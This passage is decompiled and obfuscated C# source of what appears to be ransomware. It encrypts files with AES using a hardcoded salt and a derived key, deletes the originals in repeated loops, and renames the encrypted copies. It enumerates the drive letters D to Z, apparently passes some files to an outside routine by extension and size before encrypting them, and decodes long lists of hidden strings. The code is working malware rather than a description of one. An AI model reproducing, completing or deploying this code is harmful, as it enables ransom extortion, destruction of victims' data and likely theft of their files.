								yaxtgGEmAXdl(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107386442), Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd));
							}
						}
						else
						{
							try
							{
								if (!kGnGVVSmVYCjkQ)
								{
									oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, kQukpPiiliUKcIy, Convert.FromBase64String(NfvyHzKylGMJES));
								}
								else
								{
									oRXdQfZZjJ(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, Convert.FromBase64String(CS_0024_003C_003E8__locals0.DtfvoUQGiFhnd), Convert.FromBase64String(NfvyHzKylGMJES));
								}
							}
							catch (Exception ex14)
							{
								if (yqFjfeWQNnFtS)
								{
									try
									{
										File.AppendAllText(mldgFSRddxG, NKqHkELnIQFAdV.getString_0(107386241) + CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + NKqHkELnIQFAdV.getString_0(107386465) + ex14.Message + NKqHkELnIQFAdV.getString_0(107396708));
									}
									catch (Exception)
									{
									}
								}
								IkmoiloXkEwN++;
								return;
							}
						}
						if (kGnGVVSmVYCjkQ)
						{
							if (CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq != NKqHkELnIQFAdV.getString_0(107386447))
							{
								coknNVwPlVpucD(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO + CS_0024_003C_003E8__locals0.UfmIFRSQHUmOrq, bytes2);
							}
							else
							{
								coknNVwPlVpucD(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO, bytes2);
							}
						}
					}
					end_IL_031d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0ac2;
			IL_0ac2:
			CS_0024_003C_003E8__locals0.LVrYlUqqoFMQv.Remove(CS_0024_003C_003E8__locals0.wKxAvZiJPQtO);
		});
	}

	private static void lwEEvsRYHQlDF(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (WaGdjztjPUPAi == getString_0(107396760))
					{
						foreach (string item in VhmHymKdwdhl)
						{
							if (string_0.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107396760))
							{
								if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107397017))
							{
								try
								{
									WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386423)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386423), getString_0(107389193)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void oRXdQfZZjJ(string CEmIhiSemNFg, string NhVjSgavABa, byte[] KJKernmEKqrv, byte[] ErkfltbJUEZf = null)
	{
		try
		{
			if (WaGdjztjPUPAi == getString_0(107396760))
			{
				FileStream fileStream = new FileStream(CEmIhiSemNFg, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in VhmHymKdwdhl)
				{
					if (CEmIhiSemNFg.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107396760))
					{
						if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), CEmIhiSemNFg);
							}
							catch
							{
							}
						}
					}
					else if (CEmIhiSemNFg.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107397017))
					{
						try
						{
							WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), CEmIhiSemNFg);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (CEmIhiSemNFg != NhVjSgavABa)
		{
			File.Move(CEmIhiSemNFg, NhVjSgavABa);
			CEmIhiSemNFg = NhVjSgavABa;
		}
		byte[] bytes = IkRHWwmJhhri.lrXUmqEbANrrJ(File.ReadAllBytes(CEmIhiSemNFg), KJKernmEKqrv, ErkfltbJUEZf);
		File.WriteAllBytes(CEmIhiSemNFg, bytes);
		JhEGykDTAlk++;
	}

	private static void yaxtgGEmAXdl(string string_0, string string_1, byte[] byte_0)
	{
		RiYKHIJMVmjq CS_0024_003C_003E8__locals0 = new RiYKHIJMVmjq();
		CS_0024_003C_003E8__locals0.XUVHFXoyxzdT = string_0;
		CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string pIcqQYYbGbyxOr = CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr;
			FileStream fileStream = new FileStream(pIcqQYYbGbyxOr, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (tVdkKlIvaDpXN == getString_0(107396760))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.XUVHFXoyxzdT, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.XUVHFXoyxzdT, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.XUVHFXoyxzdT, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr.Length > 0)
				{
					if (WaGdjztjPUPAi == getString_0(107396760))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.XUVHFXoyxzdT, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in VhmHymKdwdhl)
						{
							if (CS_0024_003C_003E8__locals0.XUVHFXoyxzdT.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107396760))
							{
								if (Convert.ToInt32(KrPsgnPgWT) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), CS_0024_003C_003E8__locals0.XUVHFXoyxzdT);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.XUVHFXoyxzdT.ToLower().EndsWith(item) && DqotASAdvjyOTQWi == getString_0(107397017))
							{
								try
								{
									WspNJLioodtR.diqCpqybOKjOLc(getString_0(107389242), getString_0(107389269), getString_0(107389256), CS_0024_003C_003E8__locals0.XUVHFXoyxzdT);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.XUVHFXoyxzdT);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr.EndsWith(getString_0(107386423)))
					{
						File.Move(CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr, CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr.Replace(getString_0(107386423), getString_0(107389193)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr))
							{
								File.Delete(CS_0024_003C_003E8__locals0.pIcqQYYbGbyxOr);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(mldgFSRddxG, getString_0(107386222) + CS_0024_003C_003E8__locals0.XUVHFXoyxzdT + getString_0(107386446) + ex2.Message + getString_0(107396689));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__5()
	{
		List<string> rEZEphvZUr = REZEphvZUr;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
			{
				nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386361)), string_0);
			};
		}
		Parallel.ForEach(rEZEphvZUr, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		List<string> source = aywbxlBbStFe;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
			{
				nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386380)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
		if (GwPXdyNycpzfnH == getString_0(107396760))
		{
			string[] source2 = rankoHCABHptgp;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
				{
					nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386380)), getString_0(107386355) + string_0 + getString_0(107386346));
				};
			}
			Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
		}
		if (!nMAemjtyDhXALFt().Contains(getString_0(107386088)))
		{
			nYxlJZUFKEVvs(tzcCHjlkJpN);
		}
		else
		{
			List<string> source3 = bsRxjoCdnSAQaTIYq;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
				{
					nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107386309))), string_0);
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		}
		List<string> source4 = wnvGvgZBBKiu;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386316)), string_0);
			};
		}
		Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
	}

	private static void _003CMain_003Eb__6(string string_0)
	{
		nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386361)), string_0);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386380)), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386380)), getString_0(107386355) + string_0 + getString_0(107386346));
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(idSeAbGdhPDRu(getString_0(107386309))), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		nAUMcEQIEfjEV(NGKPoQcRFBDfbNt(getString_0(107386316)), string_0);
	}

	private static void _003CMapDrv_003Eb__17(string string_0)
	{
		dYwDIMZVPV CS_0024_003C_003E8__locals0 = new dYwDIMZVPV();
		CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb = string_0;
		if ((!CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107386267)) && !CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107386294)) && !CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107386285)) && !CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb.StartsWith(getString_0(107389193))) || !stzyYltjcngHhF.wTtycSFoMRgGzkgp(CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb))
		{
			return;
		}
		try
		{
			Thread.Sleep(lYuNICMXohCnU);
			hYDYrdRZUMfQ.Add(getString_0(107388190) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + getString_0(107386240));
			try
			{
				if (pjFetgiEucLksJ)
				{
					Console.WriteLine(getString_0(107388190) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + getString_0(107386240));
				}
			}
			catch
			{
			}
			Parallel.For(68, 91, delegate(int int_0)
			{
				Thread.Sleep(lYuNICMXohCnU);
				hYDYrdRZUMfQ.Add(dYwDIMZVPV.getString_0(107388196) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + dYwDIMZVPV.getString_0(107397200) + (char)int_0 + dYwDIMZVPV.getString_0(107403760));
				try
				{
					if (pjFetgiEucLksJ)
					{
						Console.WriteLine(dYwDIMZVPV.getString_0(107388196) + CS_0024_003C_003E8__locals0.hRJiNuDBwKOTb + dYwDIMZVPV.getString_0(107397200) + (char)int_0 + dYwDIMZVPV.getString_0(107403760));
					}
				}
				catch
				{
				}
			});
		}
		catch
		{
		}
	}

	static jIDJtYejSBzFCRw()
	{
		Strings.CreateGetStringDelegate(typeof(jIDJtYejSBzFCRw));
		THOjaVpHiJe = getString_0(107389060);
		kQukpPiiliUKcIy = null;
		vFJQwHPilYftJL = getString_0(107397017);
		mEIFFxHZBgNd = getString_0(107386231);
		hYDYrdRZUMfQ = new List<string>();
		ZTIrvqyduFISa = new List<string>();
		drizePQFAsYv = getString_0(107397017);
		DtfvoUQGiFhnd = getString_0(107389193);
		NfvyHzKylGMJES = getString_0(107389193);
		ydOQhvmvcpZ = getString_0(107389193);
		nEMNsXtEHn = getString_0(107397017);
		lmziWUbxBtbDg = 0;
		LzcJtwyMvPk = getString_0(107397017);
		LznwsrMIBOtXQE = getString_0(107397017);
		ThDQkMiTEWeNLV = getString_0(107397017);
		aTEhTIahfyBm = getString_0(107386250);
		hFKTUljpgDOuMqZ = getString_0(107397017);
		QsGuvJmhkqwuvtfF = getString_0(107397017);
		XJjGaKhSIZHFxe = getString_0(107397017);
		mgzuKEQvMyBiY = getString_0(107397017);
		rAkOOmeaOUziAtZ = new List<string>
		{
			NGKPoQcRFBDfbNt(getString_0(107385701)),
			NGKPoQcRFBDfbNt(getString_0(107385716)),
			NGKPoQcRFBDfbNt(getString_0(107385659)),
			NGKPoQcRFBDfbNt(getString_0(107385674)),
			NGKPoQcRFBDfbNt(getString_0(107385649)),
			NGKPoQcRFBDfbNt(getString_0(107385592)),
			NGKPoQcRFBDfbNt(getString_0(107385607)),
			NGKPoQcRFBDfbNt(getString_0(107385582)),
			NGKPoQcRFBDfbNt(getString_0(107385557)),
			NGKPoQcRFBDfbNt(getString_0(107385500)),
			NGKPoQcRFBDfbNt(getString_0(107385515)),
			NGKPoQcRFBDfbNt(getString_0(107385490)),
			NGKPoQcRFBDfbNt(getString_0(107385945))
		};
		FXuQVyDsFHEyD = new List<string>();
		HsKiCRPuvRZXJ = getString_0(107397017);
		KXhJJFYGXOkgw = getString_0(107397017);
		bngiVTpcMqH = getString_0(107397017);
		qiPmErxJQggVfu = new List<string>();
		wwoDHXHimBsmdA = getString_0(107397017);
		PhfXqZjqxgzX = getString_0(107385920);
		DDyGmAdWrJ = getString_0(107396760);
		CmLvgLtNWV = getString_0(107397017);
		KhiDjtqGcXyab = new List<string>
		{
			NGKPoQcRFBDfbNt(getString_0(107385903)),
			NGKPoQcRFBDfbNt(getString_0(107385870)),
			NGKPoQcRFBDfbNt(getString_0(107385837)),
			NGKPoQcRFBDfbNt(getString_0(107385804)),
			NGKPoQcRFBDfbNt(getString_0(107385771)),
			NGKPoQcRFBDfbNt(getString_0(107385742)),
			NGKPoQcRFBDfbNt(getString_0(107385173)),
			NGKPoQcRFBDfbNt(getString_0(107385112)),
			NGKPoQcRFBDfbNt(getString_0(107385099)),
			NGKPoQcRFBDfbNt(getString_0(107385034)),
			NGKPoQcRFBDfbNt(getString_0(107385001)),
			NGKPoQcRFBDfbNt(getString_0(107384968)),
			NGKPoQcRFBDfbNt(getString_0(107385447)),
			NGKPoQcRFBDfbNt(getString_0(107385418)),
			NGKPoQcRFBDfbNt(getString_0(107385389)),
			NGKPoQcRFBDfbNt(getString_0(107385316)),
			NGKPoQcRFBDfbNt(getString_0(107385275)),
			NGKPoQcRFBDfbNt(getString_0(107385218)),
			NGKPoQcRFBDfbNt(getString_0(107384689)),
			NGKPoQcRFBDfbNt(getString_0(107384656)),
			NGKPoQcRFBDfbNt(getString_0(107384627)),
			NGKPoQcRFBDfbNt(getString_0(107384586)),
			NGKPoQcRFBDfbNt(getString_0(107384513)),
			NGKPoQcRFBDfbNt(getString_0(107384480)),
			NGKPoQcRFBDfbNt(getString_0(107384463)),
			NGKPoQcRFBDfbNt(getString_0(107384918)),
			NGKPoQcRFBDfbNt(getString_0(107384877)),
			NGKPoQcRFBDfbNt(getString_0(107384848)),
			NGKPoQcRFBDfbNt(getString_0(107384807)),
			NGKPoQcRFBDfbNt(getString_0(107384750)),
			NGKPoQcRFBDfbNt(getString_0(107384173)),
			NGKPoQcRFBDfbNt(getString_0(107384116)),
			NGKPoQcRFBDfbNt(getString_0(107384051)),
			NGKPoQcRFBDfbNt(getString_0(107383970)),
			NGKPoQcRFBDfbNt(getString_0(107384417)),
			NGKPoQcRFBDfbNt(getString_0(107384392)),
			NGKPoQcRFBDfbNt(getString_0(107384359)),
			NGKPoQcRFBDfbNt(getString_0(107384286)),
			NGKPoQcRFBDfbNt(getString_0(107384277)),
			NGKPoQcRFBDfbNt(getString_0(107384232)),
			NGKPoQcRFBDfbNt(getString_0(107384203)),
			NGKPoQcRFBDfbNt(getString_0(107383626)),
			NGKPoQcRFBDfbNt(getString_0(107383553)),
			NGKPoQcRFBDfbNt(getString_0(107383520)),
			NGKPoQcRFBDfbNt(getString_0(107383479)),
			NGKPoQcRFBDfbNt(getString_0(107383430)),
			NGKPoQcRFBDfbNt(getString_0(107383897)),
			NGKPoQcRFBDfbNt(getString_0(107383856)),
			NGKPoQcRFBDfbNt(getString_0(107383779)),
			NGKPoQcRFBDfbNt(getString_0(107383766)),
			NGKPoQcRFBDfbNt(getString_0(107383721)),
			NGKPoQcRFBDfbNt(getString_0(107383136)),
			NGKPoQcRFBDfbNt(getString_0(107383063)),
			NGKPoQcRFBDfbNt(getString_0(107383034)),
			NGKPoQcRFBDfbNt(getString_0(107383025)),
			NGKPoQcRFBDfbNt(getString_0(107382960)),
			NGKPoQcRFBDfbNt(getString_0(107383395)),
			NGKPoQcRFBDfbNt(getString_0(107383366)),
			NGKPoQcRFBDfbNt(getString_0(107383321)),
			NGKPoQcRFBDfbNt(getString_0(107383256)),
			NGKPoQcRFBDfbNt(getString_0(107383227)),
			NGKPoQcRFBDfbNt(getString_0(107383170)),
			NGKPoQcRFBDfbNt(getString_0(107382593)),
			NGKPoQcRFBDfbNt(getString_0(107382552)),
			NGKPoQcRFBDfbNt(getString_0(107382523)),
			NGKPoQcRFBDfbNt(getString_0(107382514)),
			NGKPoQcRFBDfbNt(getString_0(107382401)),
			NGKPoQcRFBDfbNt(getString_0(107382852)),
			NGKPoQcRFBDfbNt(getString_0(107382779)),
			NGKPoQcRFBDfbNt(getString_0(107382766)),
			NGKPoQcRFBDfbNt(getString_0(107382733)),
			NGKPoQcRFBDfbNt(getString_0(107382660)),
			NGKPoQcRFBDfbNt(getString_0(107382071)),
			NGKPoQcRFBDfbNt(getString_0(107382058)),
			NGKPoQcRFBDfbNt(getString_0(107381969)),
			NGKPoQcRFBDfbNt(getString_0(107381888)),
			NGKPoQcRFBDfbNt(getString_0(107382371)),
			NGKPoQcRFBDfbNt(getString_0(107382330)),
			NGKPoQcRFBDfbNt(getString_0(107382265)),
			NGKPoQcRFBDfbNt(getString_0(107382248)),
			NGKPoQcRFBDfbNt(getString_0(107382191)),
			NGKPoQcRFBDfbNt(getString_0(107382158)),
			NGKPoQcRFBDfbNt(getString_0(107381585)),
			NGKPoQcRFBDfbNt(getString_0(107381496)),
			NGKPoQcRFBDfbNt(getString_0(107384392)),
			NGKPoQcRFBDfbNt(getString_0(107381439)),
			NGKPoQcRFBDfbNt(getString_0(107381430)),
			NGKPoQcRFBDfbNt(getString_0(107381821)),
			NGKPoQcRFBDfbNt(getString_0(107381808)),
			NGKPoQcRFBDfbNt(getString_0(107381747)),
			NGKPoQcRFBDfbNt(getString_0(107381690)),
			NGKPoQcRFBDfbNt(getString_0(107381677)),
			NGKPoQcRFBDfbNt(getString_0(107381084)),
			NGKPoQcRFBDfbNt(getString_0(107384750)),
			NGKPoQcRFBDfbNt(getString_0(107381019)),
			NGKPoQcRFBDfbNt(getString_0(107381010)),
			NGKPoQcRFBDfbNt(getString_0(107380921)),
			NGKPoQcRFBDfbNt(getString_0(107384173)),
			NGKPoQcRFBDfbNt(getString_0(107380880)),
			NGKPoQcRFBDfbNt(getString_0(107381311)),
			NGKPoQcRFBDfbNt(getString_0(107381222)),
			NGKPoQcRFBDfbNt(getString_0(107381157)),
			NGKPoQcRFBDfbNt(getString_0(107381140)),
			NGKPoQcRFBDfbNt(getString_0(107384051)),
			NGKPoQcRFBDfbNt(getString_0(107413319)),
			NGKPoQcRFBDfbNt(getString_0(107384359)),
			NGKPoQcRFBDfbNt(getString_0(107383970)),
			NGKPoQcRFBDfbNt(getString_0(107413254)),
			NGKPoQcRFBDfbNt(getString_0(107413229)),
			NGKPoQcRFBDfbNt(getString_0(107384417)),
			NGKPoQcRFBDfbNt(getString_0(107413196)),
			NGKPoQcRFBDfbNt(getString_0(107413115)),
			NGKPoQcRFBDfbNt(getString_0(107413610)),
			NGKPoQcRFBDfbNt(getString_0(107384807)),
			NGKPoQcRFBDfbNt(getString_0(107413585)),
			NGKPoQcRFBDfbNt(getString_0(107413508)),
			NGKPoQcRFBDfbNt(getString_0(107413511)),
			NGKPoQcRFBDfbNt(getString_0(107413482)),
			NGKPoQcRFBDfbNt(getString_0(107413405)),
			NGKPoQcRFBDfbNt(getString_0(107413372)),
			NGKPoQcRFBDfbNt(getString_0(107412835)),
			NGKPoQcRFBDfbNt(getString_0(107412822)),
			NGKPoQcRFBDfbNt(getString_0(107412765)),
			NGKPoQcRFBDfbNt(getString_0(107412756)),
			NGKPoQcRFBDfbNt(getString_0(107412711)),
			NGKPoQcRFBDfbNt(getString_0(107412662)),
			NGKPoQcRFBDfbNt(getString_0(107413085)),
			NGKPoQcRFBDfbNt(getString_0(107413052)),
			NGKPoQcRFBDfbNt(getString_0(107413039)),
			NGKPoQcRFBDfbNt(getString_0(107413006)),
			NGKPoQcRFBDfbNt(getString_0(107412933)),
			NGKPoQcRFBDfbNt(getString_0(107384848)),
			NGKPoQcRFBDfbNt(getString_0(107412662)),
			NGKPoQcRFBDfbNt(getString_0(107412892)),
			NGKPoQcRFBDfbNt(getString_0(107412863)),
			NGKPoQcRFBDfbNt(getString_0(107412322)),
			NGKPoQcRFBDfbNt(getString_0(107412305)),
			NGKPoQcRFBDfbNt(getString_0(107412264)),
			NGKPoQcRFBDfbNt(getString_0(107412203)),
			NGKPoQcRFBDfbNt(getString_0(107412098)),
			NGKPoQcRFBDfbNt(getString_0(107412581)),
			NGKPoQcRFBDfbNt(getString_0(107412548)),
			NGKPoQcRFBDfbNt(getString_0(107412475)),
			NGKPoQcRFBDfbNt(getString_0(107412446)),
			NGKPoQcRFBDfbNt(getString_0(107412433)),
			NGKPoQcRFBDfbNt(getString_0(107412368)),
			NGKPoQcRFBDfbNt(getString_0(107411823)),
			NGKPoQcRFBDfbNt(getString_0(107411746)),
			NGKPoQcRFBDfbNt(getString_0(107411685)),
			NGKPoQcRFBDfbNt(getString_0(107411652)),
			NGKPoQcRFBDfbNt(getString_0(107411607)),
			NGKPoQcRFBDfbNt(getString_0(107412086)),
			NGKPoQcRFBDfbNt(getString_0(107412053)),
			NGKPoQcRFBDfbNt(getString_0(107412012)),
			NGKPoQcRFBDfbNt(getString_0(107411931)),
			NGKPoQcRFBDfbNt(getString_0(107384463)),
			NGKPoQcRFBDfbNt(getString_0(107411902)),
			NGKPoQcRFBDfbNt(getString_0(107411845)),
			NGKPoQcRFBDfbNt(getString_0(107411292)),
			NGKPoQcRFBDfbNt(getString_0(107411279)),
			NGKPoQcRFBDfbNt(getString_0(107411206)),
			NGKPoQcRFBDfbNt(getString_0(107411161)),
			NGKPoQcRFBDfbNt(getString_0(107411100)),
			NGKPoQcRFBDfbNt(getString_0(107411083)),
			NGKPoQcRFBDfbNt(getString_0(107411514)),
			NGKPoQcRFBDfbNt(getString_0(107411457)),
			NGKPoQcRFBDfbNt(getString_0(107411432)),
			NGKPoQcRFBDfbNt(getString_0(107411355)),
			NGKPoQcRFBDfbNt(getString_0(107411346)),
			NGKPoQcRFBDfbNt(getString_0(107410745)),
			NGKPoQcRFBDfbNt(getString_0(107384918)),
			NGKPoQcRFBDfbNt(getString_0(107410704)),
			NGKPoQcRFBDfbNt(getString_0(107410675)),
			NGKPoQcRFBDfbNt(getString_0(107410642)),
			NGKPoQcRFBDfbNt(getString_0(107410601)),
			NGKPoQcRFBDfbNt(getString_0(107410572)),
			NGKPoQcRFBDfbNt(getString_0(107384480)),
			NGKPoQcRFBDfbNt(getString_0(107411011)),
			NGKPoQcRFBDfbNt(getString_0(107410994)),
			NGKPoQcRFBDfbNt(getString_0(107410965)),
			NGKPoQcRFBDfbNt(getString_0(107383227)),
			NGKPoQcRFBDfbNt(getString_0(107410932)),
			NGKPoQcRFBDfbNt(getString_0(107410965)),
			NGKPoQcRFBDfbNt(getString_0(107410871)),
			NGKPoQcRFBDfbNt(getString_0(107410842)),
			NGKPoQcRFBDfbNt(getString_0(107410813)),
			NGKPoQcRFBDfbNt(getString_0(107410284)),
			NGKPoQcRFBDfbNt(getString_0(107410203)),
			NGKPoQcRFBDfbNt(getString_0(107410194)),
			NGKPoQcRFBDfbNt(getString_0(107410133)),
			NGKPoQcRFBDfbNt(getString_0(107410072)),
			NGKPoQcRFBDfbNt(getString_0(107410063)),
			NGKPoQcRFBDfbNt(getString_0(107410498)),
			NGKPoQcRFBDfbNt(getString_0(107410485)),
			NGKPoQcRFBDfbNt(getString_0(107410452)),
			NGKPoQcRFBDfbNt(getString_0(107410363)),
			NGKPoQcRFBDfbNt(getString_0(107410350)),
			NGKPoQcRFBDfbNt(getString_0(107409781)),
			NGKPoQcRFBDfbNt(getString_0(107409748)),
			NGKPoQcRFBDfbNt(getString_0(107409707)),
			NGKPoQcRFBDfbNt(getString_0(107409678)),
			NGKPoQcRFBDfbNt(getString_0(107409617)),
			NGKPoQcRFBDfbNt(getString_0(107409584)),
